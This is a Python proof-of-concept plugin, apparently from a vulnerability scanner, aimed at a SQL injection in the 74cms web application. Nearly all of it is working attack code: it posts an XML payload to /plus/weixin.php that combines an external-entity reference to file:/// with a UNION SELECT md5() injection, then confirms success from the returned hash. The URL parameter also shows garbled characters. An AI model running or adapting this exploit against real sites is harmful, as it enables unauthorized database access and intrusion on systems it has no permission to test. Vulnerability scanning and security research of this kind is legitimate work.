#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import hashlib
import requests
import random
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "74cms sql注入",
        "desc": "74cms sql注入漏洞",
        "grade": "高",
        "type": "web",
        "keyword": "tag:74cms",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg,
        'Content-Type': 'text/xml',
        }
    rand_str = str(random.randint(200000000, 210000000))
    try:
        r = requests.post(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\xc3\x97tamp=&nonce=', 
            data = f'<?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%\' union select md5({rand_str})#</Content></xml>',
            headers=headers,
            timeout=timeout, 
            allow_redirects=False,
            verify=False
            )
        if hashlib.md5(rand_str.encode('utf-8')).hexdigest() in r.text:
            return True
        else:
            return False
    except Exception as e:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

